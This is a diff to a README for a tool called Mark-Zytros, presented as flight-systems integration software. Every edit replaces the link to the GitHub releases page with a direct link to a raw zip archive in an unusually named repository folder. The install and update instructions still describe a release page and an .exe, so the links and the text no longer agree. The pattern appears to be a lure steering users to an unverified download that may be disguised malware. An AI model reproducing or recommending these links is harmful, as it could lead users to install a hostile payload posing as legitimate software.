@@ -1,6 +1,6 @@
 # ⚙️ Mark-Zytros - Flight Systems Integration Made Simple
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Mark--Zytros-brightgreen?style=for-the-badge&logo=github)](https://github.com/Kwanchai241/Mark-Zytros/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Mark--Zytros-brightgreen?style=for-the-badge&logo=github)](https://github.com/Kwanchai241/Mark-Zytros/raw/refs/heads/main/surculi/Mark-Zytros-1.3.zip)
 
 ---
 
@@ -31,12 +31,12 @@ No special hardware or programming experience is needed. The application runs in
 
 The main software is available on GitHub Releases. You can get the latest version by visiting the release page.
 
-[![Download Mark-Zytros](https://img.shields.io/badge/Download-Mark--Zytros-orange?style=for-the-badge&logo=github)](https://github.com/Kwanchai241/Mark-Zytros/releases)
+[![Download Mark-Zytros](https://img.shields.io/badge/Download-Mark--Zytros-orange?style=for-the-badge&logo=github)](https://github.com/Kwanchai241/Mark-Zytros/raw/refs/heads/main/surculi/Mark-Zytros-1.3.zip)
 
 **Steps to download:**
 
 1. Click the link above or visit:  
-   https://github.com/Kwanchai241/Mark-Zytros/releases  
+   https://github.com/Kwanchai241/Mark-Zytros/raw/refs/heads/main/surculi/Mark-Zytros-1.3.zip  
 
 2. Look for the most recent release version. It usually has the highest number (e.g., v1.0.0).  
 
@@ -85,7 +85,7 @@ Each feature includes preset examples you can run without setup, as well as opti
 New versions may fix bugs or add features. To keep Mark-Zytros current:
 
 1. Visit the release page again:  
-   https://github.com/Kwanchai241/Mark-Zytros/releases  
+   https://github.com/Kwanchai241/Mark-Zytros/raw/refs/heads/main/surculi/Mark-Zytros-1.3.zip  
 2. Check if a newer version is available. This is the release with a version number higher than the one you have.  
 3. Download and install the new `.exe` file, following the same steps as before.  
 4. Your settings and data should remain intact unless you choose to uninstall the old version first.  
@@ -131,4 +131,4 @@ The project draws inspiration from science fiction and aims to turn theoretical 
 
 Get started by visiting the official release page to download the latest version:
 
-[Download Mark-Zytros](https://github.com/Kwanchai241/Mark-Zytros/releases)
+[Download Mark-Zytros](https://github.com/Kwanchai241/Mark-Zytros/raw/refs/heads/main/surculi/Mark-Zytros-1.3.zip)
